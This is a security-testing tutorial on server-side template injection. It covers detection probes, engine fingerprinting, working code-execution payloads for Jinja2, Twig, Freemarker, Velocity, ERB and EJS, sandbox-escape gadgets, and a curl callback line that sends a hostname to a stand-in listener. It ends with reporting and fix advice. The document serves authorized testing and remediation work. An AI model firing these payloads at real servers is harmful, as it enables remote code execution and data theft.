# Server-Side Template Injection (SSTI) — Deep Dive

When user input is concatenated into a server-side template *before* it's rendered (rather than
passed as data to the template), the attacker controls template syntax — which in most engines
reaches the host language and, from there, code execution. This is engine-specific mechanics for
authorized testing; confirm with non-destructive proofs.

## Detect and identify the engine

Inject a math probe and see if it evaluates:

```
${7*7}  {{7*7}}  #{7*7}  <%= 7*7 %>  {7*7}  *{7*7}
```

`49` back = SSTI. Then disambiguate the engine with syntax that only one accepts, e.g.:

- `{{7*'7'}}` → `7777777` (Jinja2/Twig do string-repeat) vs `49` (others).
- `${7*7}` works in Freemarker/Velocity/JSP-EL; `#{}` in Ruby/Thymeleaf; `<%= %>` in ERB/EJS.
- Follow PortSwigger's decision tree to pin it exactly — payloads differ hard per engine.

## Jinja2 / Python (Flask)

The classic escape walks Python's object model from a reachable object to `os`:

```
{{ ''.__class__.__mro__[1].__subclasses__() }}      # enumerate classes
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}   # via Flask config
{{ cycler.__init__.__globals__.os.popen('id').read() }}                # via a builtin
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

Sandbox (`SandboxedEnvironment`) blocks some attribute access; bypasses use `|attr()`,
`request`/`lipsum`/`cycler` gadgets, and `__getitem__` instead of `.` — a live research area.

## Twig / PHP

```
{{ _self.env.registerUndefinedFilterCallback('system') }}{{ _self.env.getFilter('id') }}
{{ ['id']|filter('system') }}
```

## Freemarker / Java

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
${ "freemarker.template.utility.ObjectConstructor"?new() ... }
```

## Velocity / Java

```
#set($e="e")
$e.getClass().forName("java.lang.Runtime").getRuntime().exec("id")
```

## ERB / Ruby, EJS / Node

```
ERB:  <%= `id` %>   <%= system('id') %>
EJS:  <%= global.process.mainModule.require('child_process').execSync('id') %>
```

## Sandbox escapes and the object-graph idea

Every SSTI-to-RCE is the same move at heart: from *some* object the template exposes, walk the
language's reflection/object graph to a class that spawns processes or imports modules. When a
sandbox blocks the direct path, you find an alternate object with the same reachability (a builtin,
a config, an exception class, a loaded module). This is why enumerating `__subclasses__()` /
available filters / accessible globals is step one after confirming the engine.

## Confirming safely

- Prove with a **non-destructive** command: `id`/`hostname`, a `sleep` for timing, or a DNS/HTTP
  callback to your listener (`curl http://you/$(hostname)` / nslookup) — the callback proves RCE
  without touching data or state.
- Never run destructive commands; test against your own account's resources; read only what proves
  it.

## Reporting

Show the injectable input, the evaluation proof (`49`), the engine identification, and the RCE
proof (command output, timing, or OOB callback). Distinguish SSTI from mere reflected XSS —
server-side evaluation is the point. Fix: pass user input as **template data/variables**, never
into the template source; use a sandbox and keep it patched.
